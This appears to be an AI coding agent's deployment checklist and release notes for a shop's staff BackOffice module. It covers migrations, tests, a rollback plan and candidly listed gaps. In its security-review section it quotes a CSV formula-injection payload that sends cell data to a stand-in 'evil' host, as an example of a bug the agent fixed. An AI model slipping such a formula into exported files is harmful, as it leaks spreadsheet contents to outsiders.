# DANK BackOffice — Deployment Prep (Phase 7)

**Nothing has been deployed.** This is the checklist and the risk list for when Bryan is ready to do
it himself — per the brief's rule 14 and "do not deploy to production... without explicit approval."

## Release notes (v1.1 — this build)

New, additive-only surface on top of the existing site:

- **New page:** `/backoffice` (`backoffice.html`) — staff-gated, reuses the existing staffportal
  login/session (no new login screen, no new credentials). 11 tabs: Overview, Products, Inventory,
  Food & Drinks, Kitchen, Sales Reports, Suppliers, Purchase Orders, Expenses, Promotions, Settings.
- **New API:** `/api/backoffice/*` — stores (incl. editing), inventory ledger, suppliers, purchase
  orders, stocktakes, stock transfers, product cost/supplier settings, ingredients, recipes (live
  cost-per-serving), kitchen tickets, expenses (incl. receipt-photo attachments and a monthly
  cost-analysis view), and reports — 9 types (sales by product/category, sales by store [flagged
  unavailable], discounts, returns & corrections, COGS [revenue-only, see known gaps], stock value,
  waste costs, staff activity), each exportable to CSV from the UI.
- **New database tables:** `bo_*` in the same Supabase project, additive only — see
  `DATABASE_SCHEMA.md`. **Not yet applied to the live database.**
- **Staff roles & permissions:** added `kitchen` role; added BackOffice scopes to `manager`/
  `professional`; added a `settings` scope. Existing `owner`/`parttime` behavior is unchanged.
  **New:** owners/managers can grant one BackOffice scope to one person individually (Settings →
  Staff permissions) on top of their role, without changing their role — closes the gap with
  StoreHub's granular per-module permission model observed in Phase 1, without replacing the
  existing role system. A manager can never grant a scope they don't have themselves.
- **Promotions:** the existing `api/_promotion.js` module gained two additive, backward-compatible
  fields — `categories` (only enforced when a caller explicitly passes the cart's categories; the
  public checkout endpoint still doesn't, so existing behavior is unchanged) and redemption history
  (logged from `api/order.js` in its own try/catch, after the order is already confirmed saved, so a
  logging failure can never affect checkout). BackOffice's Promotions tab surfaces usage + redemption
  history; creating/editing codes still happens in the existing staffportal editor.
- **Touches existing checkout-adjacent files** (new this round, flagged explicitly): `api/order.js`
  (one new, defensively-isolated write after order save succeeds) and `api/staff-tools.js` (the
  existing promo editor gained a `categories` field and an optional `?redemptions=1` read). Both are
  additive and covered by `tests/promotion-categories.test.js`; the full existing suite (154 tests
  pre-dating this work) still passes unchanged.
- **Explicitly NOT included:** any payment/checkout/gateway code, any change to BRYAN POS's feed, any
  change to the storefront's own pages, any change to existing order/pricing behavior.

## Release notes (v1.2 — third pass, this build)

A third gap-closing pass against the original master prompt, on top of v1.1. Additive only, same
"reuse, don't duplicate" posture as before:

- **Unified audit log** (`bo_audit_log`, migration `0002`) — every create/update/delete/status-change
  across suppliers, purchase orders, recipes, ingredients, stores, expenses, and staff account/role/
  scope changes now writes a before/after row via a new `boAudit()` helper in `api/_bo-db.js`. Stock
  movements keep their own separate append-only trail (`bo_inventory_ledger`) — not duplicated here.
  An audit-log write failure never blocks or rolls back the action it's recording (logged, swallowed).
  Surfaced read-only in BackOffice → Settings → Audit log, and via `GET /api/backoffice/audit-log`
  (requires the `settings` scope).
- **Recurring expenses, made real.** `bo_expenses.recurring` existed before but nothing acted on it.
  Two new columns (`next_generated`, `generated_from`) and a generator that runs on every
  `GET /api/backoffice/expenses`: a due recurring expense spawns its successor exactly once (guarded
  by the same compare-and-swap shape as the kitchen ticket consume-once guard), chained and traceable,
  and the generation itself is audit-logged as `system:recurring`. No cron involved — this repo has no
  scheduled task runner, so generation happens on read instead.
- **Import validation, duplicate detection and reconciliation** (Module G from the original brief) —
  new `/api/backoffice/import` + `bo_import_batches`/`bo_import_rows` (migration `0002`). Staff upload
  a CSV (bank statement, delivery-platform settlement, accounting export) via Expenses → Import &
  reconciliation; it's checked against existing `bo_expenses` (or near-dated orders, for a `sales`
  import) and reported as matched/unmatched/duplicate-in-file/invalid. **This never creates a new
  expense or order** — per the brief's "never fabricate financial information" rule, it's a
  reconciliation report, not a side door into confirmed records.
- **PDF export** (Expenses, Reports) via the browser's own print-to-PDF — no new client-side library.
  A `@media print` block hides the nav/forms/toast and prints only the current tab's tables under a
  plain header.
- **Touches existing files**, additive only: `api/staff-auth.js` (every staff-account mutation now
  also calls `boAudit()`), and the six backoffice endpoint files for suppliers/stores/recipes/
  ingredients/purchase-orders/expenses (each create/update/delete now also writes its audit row).
  `backoffice.html` gained the Import box (Expenses tab), the Audit log card (Settings tab), and two
  "Export PDF" buttons (Expenses, Reports). No existing endpoint's request/response shape changed.
- **Tests:** `tests/backoffice-migration.test.js` gained 4 tests running migration `0002` against real
  Postgres (pglite) — table existence, column defaults, check-constraint rejection, cascade delete.
  `tests/backoffice.test.js` gained tests for audit-log writes on supplier/PO mutations and the
  recurring-expense generator's exactly-once behavior. **182/182 tests pass.**
- **Not yet done:** migration `0002` has not been applied to Bryan's real Supabase project (same
  pending-his-review status as `0001`); this round is not yet merged.

## Pre-deployment checklist

1. **Apply the migrations, in order.** Run `supabase/migrations/0001_dank_backoffice.sql` then
   `0002_dank_backoffice_audit_import.sql` via the Supabase SQL editor or CLI against the same
   project (`SUPABASE_URL` already in Vercel — Tokyo region). Both are written to be safe to re-run
   (`IF NOT EXISTS`/`ON CONFLICT DO NOTHING` throughout) if interrupted partway.
2. **No new environment variables are required.** BackOffice reuses `SUPABASE_URL` and
   `SUPABASE_SERVICE_ROLE_KEY`, already set for `site_kv`, and the existing `STAFF_KEY`/
   `ADMIN_SECRET`/`STAFF_SESSION_SECRET` for auth. Confirm via `/api/health` that
   `wired.supabase` (or equivalent) is already true before relying on BackOffice — if Supabase is
   misconfigured, every `/api/backoffice/*` endpoint answers `503`, loudly, rather than silently
   doing nothing (same fail-closed posture as the rest of this repo's single-purpose secrets).
3. **Run the test suite:** `node --test tests/` — 182 tests as of this build, including
   `tests/backoffice.test.js`, `tests/backoffice-migration.test.js` (now covering both migrations),
   and `tests/promotion-categories.test.js`. All must pass.
4. **Syntax-check `backoffice.html`'s inline script** the same way the rest of the repo does (extract
   `<script>` blocks without `src=`, run `node --check`) — done once already this session, redo after
   any further edits.
5. **Smoke-test on staging/preview** (a Vercel preview deployment, not production): log into
   `/staffportal`, navigate to `/backoffice`, confirm the Overview tab loads (it will show
   `sales.source:"unavailable"` gracefully if orders:index is empty, and `inventory` sections will
   read `"not configured"` if the migration hasn't been applied yet on that environment — both are
   expected, not bugs).
6. **Seed real data before trusting any report:** `bo_stores` seeds itself from `branches.json` on
   first read; everything else (suppliers, product cost/par levels, ingredients, recipes) starts
   empty and needs real entry — the Dashboard and Reports tabs will look empty/zero until then. This
   is expected, not a bug: nothing is pre-filled with guessed data.

## Verification actually performed this session (not just claimed)

Two things flagged earlier as "unverified claims" were genuinely tested, not just asserted:

- **The migration against real Postgres.** `tests/backoffice-migration.test.js` runs the actual
  `0001_dank_backoffice.sql` against `@electric-sql/pglite` (Postgres compiled to WASM — a real
  Postgres engine, no Docker needed), now a devDependency (the first one this repo has ever
  declared — see note in that test file for why that's fine: it's test-only, nothing deployed to
  Vercel imports it). It proved: the migration runs clean and is idempotent, all 17 tables exist,
  foreign keys and check constraints actually reject bad data (not just declared — the in-memory
  fake in `tests/backoffice.test.js` couldn't catch a real constraint bug), column defaults apply,
  `bo_ledger_adjust()` and `bo_next_po_number()` work correctly as real plpgsql/sequence objects,
  cascade deletes work, and RLS is enabled on every table. **This is still not the same as running
  it against Bryan's actual production Supabase project** — that needs his own credentials and his
  own execution, per the checklist above. What changed is that the SQL itself is now proven
  correct Postgres, not just "looks right."
- **`backoffice.html` in an actual browser.** Served locally with a stub API (static files + canned
  JSON responses, the same `http.createServer` + API-stubbing technique `PROJECT-HANDOVER.md`
  documents for Playwright page tests), then driven with a real browser: logged in, clicked through
  all 11 tabs, added/removed purchase-order lines, advanced a kitchen ticket (watched the error
  toast appear on a 404, then the success toast once stubbed), exported a CSV, toggled light/dark
  theme (confirmed the background actually changes color, not just an attribute flip), and
  previewed the mobile nav layout. This found and fixed one real bug: ingredient cost-per-unit
  (e.g. ฿0.05/g for rice) was rendering as "฿0" because it reused the whole-baht rounding helper
  meant for totals — now has its own precise formatter. **One real limitation:** the harness's
  window-resize tool didn't actually change the page's viewport width, so true narrow-phone
  rendering (versus the ~767px width tested, and a forced-CSS preview of the `@media` block) wasn't
  verified on a real small screen — worth a quick check on an actual phone before relying on it.
- **A later session's browser tool could resize narrower** (`window.innerWidth` confirmed at 502px,
  well under the `@media(max-width:760px)` breakpoint — though still not a true ~375px phone; this
  Chrome build appears to clamp the window to a minimum width regardless of what's requested, so
  sub-400px still hasn't been verified on a real device). At 502px the nav correctly becomes a
  horizontal scroll strip, the KPI grid collapses to 2 columns, the dashboard's SVG charts scale
  cleanly with no overflow, and forms wrap field-by-field. **This found and fixed one real bug:**
  wide tables (Expenses: checkbox+date+category+vendor+amount+note+receipt+delete, 8 columns) had no
  overflow handling, so the table forced the *entire page* wider than the viewport — `.card` now
  carries `overflow-x:auto`, so a wide table scrolls within its own card instead — confirmed both visually (the scrollbar moved from
  spanning the whole window to sitting inside the card) and by measurement: after the fix,
  `document.body.scrollWidth` (487px) is less than `window.innerWidth` (502px), so there's no
  page-level horizontal scroll left. Still outstanding: true sub-400px rendering on a real phone.

## Rollback plan

- **Code:** this is all on the `dank-backoffice` branch, not merged. Rollback = don't merge (or
  revert the merge commit if it's already landed). No existing file's prior behavior was changed —
  `_auth.js`/`_staff-accounts.js` only had new entries *added* to existing objects, nothing removed
  or renamed, so reverting is a plain revert with no data migration needed on that side.
- **Database:** both migrations are purely additive (new `bo_*` tables, one new sequence, two new
  functions, plus 0002's two new columns on `bo_expenses`). Rollback is `drop table if exists
  bo_<name> cascade;` for each table, in reverse dependency order (lines/rows tables before header
  tables, e.g. `bo_purchase_order_lines` before `bo_purchase_orders`, `bo_import_rows` before
  `bo_import_batches`), plus `alter table bo_expenses drop column if exists next_generated, drop
  column if exists generated_from;` for 0002's additions — or simply dropping/reverting all of it.
  Nothing outside the `bo_*` namespace references any of this, so rollback cannot touch `site_kv`,
  `kv_state`, `audit_log`, or any existing table.
- **No data loss risk to existing systems** either way: BackOffice never writes to `site_kv` except
  reading order records for sales reporting (read-only), and never writes to BRYAN POS's tables at
  all.

## Security review (performed, not skipped)

A 3-pass review (identify → independently verify each candidate → filter anything below 8/10
confidence as a false positive) of the full diff from the base of this branch (`81443cf`) to the
latest commit, via the `security-review` skill. One real, fixed finding; two candidates investigated
and correctly filtered out.

- **Fixed — CSV formula injection (MEDIUM, confirmed 8/10).** `api/order.js`'s checkout endpoint is
  public and never overwrites a cart line's `name`/`category`. `reports.js`'s sales-by-product/
  category/COGS rows carry that value verbatim, and `backoffice.html`'s `exportCSV()` only
  quote-doubled cells — a name like `=HYPERLINK("http://evil/?"&A1,"x")` would reach a manager's
  spreadsheet as a live formula after Export CSV. Fixed: any cell starting with `=`, `+`, `-`, `@`, or
  a tab now gets a leading `'` before quoting, the standard mitigation — verified in a real browser
  that the fix actually neutralizes all four leading characters while leaving normal values untouched.
- **Fixed anyway, despite not clearing the security bar — client-trusted `storeId`/`productKey`
  (filtered at 3/10 as a security finding; real bug, fixed as a data-integrity issue).** Two gaps in
  Phase 8's attribution code, both closed:
  - A delivery order's `o.delivery` object is spread from client input; when the road-distance quote's
    fallback path fires (no branch resolved), nothing overwrote a client-supplied `delivery.branch`,
    so a forged branch id could reach `storeId` — contradicting that code's own "never guessed"
    comment. Fixed by resolving the branch into a variable set only from the server's own quote,
    never read back from `o.delivery`.
  - `item.id` was trusted as `productKey` with no check against the real catalogue. Fixed: `productKey`
    now only accepts a client-supplied `id` after confirming it matches a real product in `getMenu()`;
    otherwise it falls through to the existing name-matching lookup, same as before.
  - Why this didn't qualify as a security finding: no auth boundary is crossed and no cross-customer
    data is exposed — a customer could only ever mislabel their *own* order's internal reporting
    metadata, with zero effect on real inventory (the stock ledger is staff-entered, never derived
    from `o.storeId`). Fixed anyway since it's cheap and internal reports should never trust
    unvalidated client input regardless of blast radius. 3 new tests in
    `tests/backoffice-order-attribution.test.js` cover a forged `delivery.branch` and a forged
    `item.id`, alongside the pre-existing legitimate-id case.
- **Investigated, correctly not a new issue — `dashboard`/`reports` gated only by the broad
  `dashboard` scope (filtered at 3/10).** Every part-time/kitchen role holds `dashboard`, and
  `/api/backoffice/reports` (cogs, stock-value, waste-costs, staff-activity) and
  `/api/backoffice/dashboard` check only that one scope, more loosely than most other new BackOffice
  endpoints. Verified this is a pre-existing pattern, not something this diff introduced: `api/sales.js`
  on `main` already let any `dashboard`-holding role reach customer PII and the full debt list via a
  `?dashboard=1` downgrade, before this branch existed. This diff extends an already-accepted trust
  boundary to new data; worth a conscious least-privilege decision later, not a vulnerability to patch
  now.

Full suite: 201/201 passing after both fixes (198 → +3 new attribution tests). No backend logic
outside `api/order.js`'s attribution block and `backoffice.html`'s `exportCSV()` changed.

## Known risks / remaining gaps (documented, not hidden)

1. **Thai cannabis compliance fields are not implemented** — `THAI_CANNABIS_COMPLIANCE.md` is
   research, not a finished design, and explicitly needs a licensed Thai lawyer's review before any
   batch/lot/prescription-reference field is added to the ledger.
2. **Sales-by-store and COGS now work, but only going forward.** `api/order.js` tags each new order
   with `storeId` and each line with `productKey` just before it saves (its own isolated try/catches,
   never touching pricing/totals — see the comments there). Delivery orders get the real branch the
   road-distance quote already resolves; table/dine-in orders (one shared table list, no per-branch
   data anywhere in the client code) are attributed to DANK Pattanakarn, confirmed as the one physical
   location that flow runs from today — if a second location ever gets its own tables, this needs a
   real per-table branch field, not a wider guess. Product lines are tagged via the item's own
   catalogue id when present (food.html), or by matching name against the live menu otherwise
   (cannabis checkout). `reports.js`'s `sales-by-store` now returns real grouped totals plus an
   explicit `untagged` count/sum for anything outside this coverage; `cogs` joins `cost_price` by
   `product_key` wherever one resolved and reports revenue-only for the rest — never a guessed figure
   either way. **What's still a real gap:** orders placed before this shipped, and any delivery whose
   route couldn't be resolved, carry no `storeId`; a renamed/delisted product's older lines carry no
   `productKey`. Both degrade to "untagged"/"revenue only," not a wrong number. Covered by
   `tests/backoffice-order-attribution.test.js` and `tests/backoffice-reports-attribution.test.js`.
3. **`backoffice.html`'s UI is functional, and has now had a real UX pass on its three busiest
   tables.** Purchase Orders, Expenses and Inventory's ledger now have sortable columns (click a
   header, click again to reverse) and the first bulk actions: select draft POs and send them all at
   once; select expenses and delete them all at once (plus a per-row Delete that didn't exist before);
   Inventory's ledger (append-only by design — no delete fits there) got a row-count selector (25/50/
   100/200) instead. Verified in a real browser against a local stub API: select-all, individual
   checkboxes re-deriving the header's checked state, string and numeric sort in both directions, and
   both bulk actions, all produce the expected result with zero console errors. Other tabs (Suppliers,
   Food & Drinks, Kitchen board) weren't touched this pass — smaller tables, lower priority. True
   narrow-phone rendering specifically still wants a check on a real device (see that section for why).
4. **Stock Takes and Stock Transfers now have UI.** `api/backoffice/stocktakes.js` and `transfers.js`
   were fully built and tested from the start (session-based counting with expected-vs-counted ledger
   writes; two-sided transfer-out/transfer-in) but `backoffice.html` never called them — a competitive
   gap against StoreHub, which has both as first-class screens. Both now live as extra cards on the
   Inventory tab: starting a count snapshots each item's current ledger balance as "expected," counts
   are entered and saved independently of completing, and completing writes one ledger adjustment per
   item that differs — an item never counted is left alone, never assumed to be zero (verified in a
   real browser: a session with one counted, one uncounted item posted exactly one adjustment).
   Transfers create as `pending` and post both sides of the ledger on Complete. Neither added new API
   surface or scopes — `inventory_view`/`inventory_adjust` already existed.
5. **The Overview dashboard now has StoreHub-parity charts.** `api/backoffice/dashboard.js` adds an
   hourly cumulative today-vs-yesterday trend, a sales-by-fulfilment donut, a sales-by-store bar
   chart, a top-products list (qty, revenue, and a genuinely-counted `daysSold` — distinct calendar
   days sold, not guessed), and %-change-vs-prior-period on the sales KPI, plus average-order-value
   and average-items-per-order. All of it comes from the same site_kv order sweep the sales total
   already read, with a Today/This week/This month toggle (the `range` param already existed).
   Charts are hand-rolled inline SVG — no new dependency — reusing `analytics.html`'s validated
   series colours (`#1faa63`/`#3987e5`; a brand-green/gold pair fails the colour-blindness check
   outright). **One deliberate deviation from StoreHub:** its channel donut is online-vs-offline; DANK
   has no in-store/POS-terminal sales data at all (BRYAN POS counter sales are never written back to
   this system — see CLAUDE.md), so faking that split would misrepresent the data. The donut instead
   breaks down by fulfilment type (delivery/table/pickup), labeled as exactly that, with the
   distinction explained in the UI itself. 8 new tests cover the aggregation (hourly bucketing,
   %-change math, days-sold counting, store scoping) — `tests/backoffice-dashboard-charts.test.js`.
6. **StoreHub modules not surveyed:** Stock Return detail screens, the 11 individual sales
   report types, Loyalty/Membership, Online Store/Beep detail, Billing — `STOREHUB_FEATURE_ANALYSIS.md`
   lists these as open unknowns. DANK BackOffice's own Stock Transfer and Expenses modules were built
   from the brief's spec directly rather than blocked on surveying StoreHub's exact UI for them.
7. **Staff permission grants expire with the session token (12h).** A scope granted via Settings →
   Staff permissions takes effect on that person's next login, same staleness window the existing
   role field already has — not a new limitation introduced by this feature.
8. **DB-level tests now run against real Postgres** (`tests/backoffice-migration.test.js`, see
   above) — `tests/backoffice.test.js`'s in-memory fake still covers the endpoint logic on top.
   What's still not tested: `bo_ledger_adjust`'s advisory lock under genuine multi-connection
   concurrency (PGlite is single-connection; the lock's correctness is standard Postgres behavior,
   trusted, but a real concurrent-write load test against an actual Postgres server hasn't been run).
9. **No backup/restore test was performed** — this needs access to the actual Supabase project
   (service-role key), which this session didn't have reason to use destructively. Recommend Bryan
   (or whoever applies the migration) takes a Supabase backup/snapshot immediately before and
   confirms Supabase's point-in-time-recovery window before trusting BackOffice with real data.

## What "done" means for this build

Per the brief's Module-by-module ask: Dashboard, Products (extension), Inventory (full ledger +
stocktakes + transfers + supply-needs via low-stock queries), Suppliers, Purchase Orders (4-state +
partial receiving), Food & Beverage (ingredients + recipes + live costing), Kitchen (ticket board,
consume-once), Expenses, and Sales Reports (by-product, stock-value) are all implemented and tested.
Promotions and Staff management intentionally reuse the existing `staffportal.html` modules rather
than being rebuilt, per `FEATURE_GAP_MATRIX.md`'s "reuse, don't duplicate" guidance — BackOffice links
out to them rather than re-implementing what already works.
